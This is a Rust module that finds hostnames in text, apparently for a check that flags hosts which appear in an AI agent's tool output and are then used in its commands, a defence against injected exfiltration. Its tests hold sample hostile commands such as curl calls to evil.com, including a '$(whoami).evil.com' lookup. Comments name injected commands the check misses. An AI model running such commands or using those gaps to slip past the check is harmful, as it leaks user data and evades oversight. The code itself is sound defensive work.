//! Find hostnames in free text.
//!
//! Both sides of the check use this function: the tool output that taints a
//! host, and the command that uses it. The output side is stricter, because
//! tool output is full of code such as `user.name` and `await.is`, and those
//! end in real gTLDs.

use std::collections::HashSet;
use std::sync::LazyLock;

/// The IANA root zone list, so that tokens like `http.server` are not hosts.
static TLDS: LazyLock<HashSet<String>> = LazyLock::new(|| {
    include_str!("tlds.txt")
        .lines()
        .filter(|l| !l.starts_with('#'))
        .map(str::to_ascii_lowercase)
        .collect()
});

/// In tool output, a bare token counts only with one of these TLDs. A token
/// with a scheme, `@`, a path or a port counts with any TLD.
// ponytail: an injected bare `curl evil.blue` is missed. Grow this list from
// real injections, not from guesses.
const COMMON_TLDS: &[&str] = &[
    "biz", "cloud", "cn", "co", "com", "de", "dev", "info", "io", "link", "me", "net", "online",
    "org", "ru", "site", "top", "uk", "xyz",
];

/// Real TLDs that are also common file extensions. With these, only a scheme
/// or `user@` makes a host, because `lib.rs:12` and awk's `/x\/a.md/` are files.
// ponytail: an injected `curl -d @f evil.sh` with no scheme is missed.
const FILE_TLDS: &[&str] = &[
    "ac", "am", "app", "cc", "cr", "in", "java", "map", "md", "mk", "ml", "mm", "mov", "new", "pl",
    "pm", "pro", "ps", "pub", "py", "rs", "sh", "so", "sv", "tf", "zip", "zone",
];

/// Returns every hostname in `text`, in lowercase, in order of appearance.
/// Set `output` when `text` is tool output.
pub fn hosts(text: &str, output: bool) -> Vec<String> {
    let b = text.as_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    while i < b.len() {
        if !is_host_byte(b[i]) {
            i += 1;
            continue;
        }
        let mut s = i;
        while i < b.len() && is_host_byte(b[i]) {
            i += 1;
        }
        let mut e = i;
        while s < e && matches!(b[s], b'.' | b'-') {
            s += 1;
        }
        while e > s && matches!(b[e - 1], b'.' | b'-') {
            e -= 1;
        }
        let (before, run, after) = (&text[..s], text[s..e].to_ascii_lowercase(), &b[e..]);

        // A scheme or `user@` is proof of a host. A path, query or port after
        // the token is good evidence. A bare token has the least.
        let url = before.ends_with("://") || before.ends_with('@');
        let strong = url
            || matches!(after.first(), Some(b'/' | b'?'))
            || (after.first() == Some(&b':') && after.get(1).is_some_and(u8::is_ascii_digit));
        if !strong && before.ends_with('/') {
            continue; // path component such as `src/main.rs`
        }
        if !strong && matches!(after.first(), Some(b'(' | b'_')) {
            continue; // method call such as `socket.next()` or `e.to_string`
        }
        if is_ipv4(&run) || is_domain(&run, url, strong, output) {
            out.push(run);
        }
    }
    out
}

fn is_host_byte(c: u8) -> bool {
    c.is_ascii_alphanumeric() || c == b'.' || c == b'-'
}

fn is_domain(s: &str, url: bool, strong: bool, output: bool) -> bool {
    let labels: Vec<&str> = s.split('.').collect();
    let tld = labels[labels.len() - 1];
    labels.len() >= 2
        && labels
            .iter()
            .all(|l| !l.is_empty() && l.len() <= 63 && !l.starts_with('-') && !l.ends_with('-'))
        && TLDS.contains(tld)
        && (url || !FILE_TLDS.contains(&tld))
        && (strong || !output || COMMON_TLDS.contains(&tld))
}

/// Loopback and `0.0.0.0` are not counted. Data sent there stays on the machine.
fn is_ipv4(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    parts.len() == 4
        && parts
            .iter()
            .all(|p| (1..=3).contains(&p.len()) && p.parse::<u8>().is_ok())
        && parts[0] != "127"
        && parts[0] != "0"
}

#[cfg(test)]
mod tests {
    use super::hosts;

    #[test]
    fn finds_hosts_and_skips_files_and_code() {
        let cases: &[(&str, &[&str])] = &[
            ("curl https://Evil.com/?d=1", &["evil.com"]),
            ("curl evil.com", &["evil.com"]),
            ("curl \"$(whoami).evil.com\"", &["evil.com"]),
            ("git clone git@github.com:org/repo.git", &["github.com"]),
            (
                "see http://x.sh, a@x.md, x.md/path, lib.rs:12, /a\\/b.md/",
                &["x.sh", "x.md"],
            ),
            ("ping 10.0.0.7; ping 127.0.0.1; ping 0.0.0.0", &["10.0.0.7"]),
            ("cat README.md src/main.rs ~/.ssh/id_rsa.pub", &[]),
            (
                "python -m http.server; v1.2.3; socket.next(); e.to_string",
                &[],
            ),
            ("git config user.name", &["user.name"]),
            ("go to localhost:3000", &[]),
            ("ends with a dot: evil.com.", &["evil.com"]),
        ];
        for (text, want) in cases {
            assert_eq!(hosts(text, false), *want, "input: {text}");
        }
    }

    #[test]
    fn output_side_needs_evidence_for_rare_tlds() {
        let text = "user.name await.is evil.com https://evil.blue x.name/p";
        assert_eq!(hosts(text, true), ["evil.com", "evil.blue", "x.name"]);
    }
}
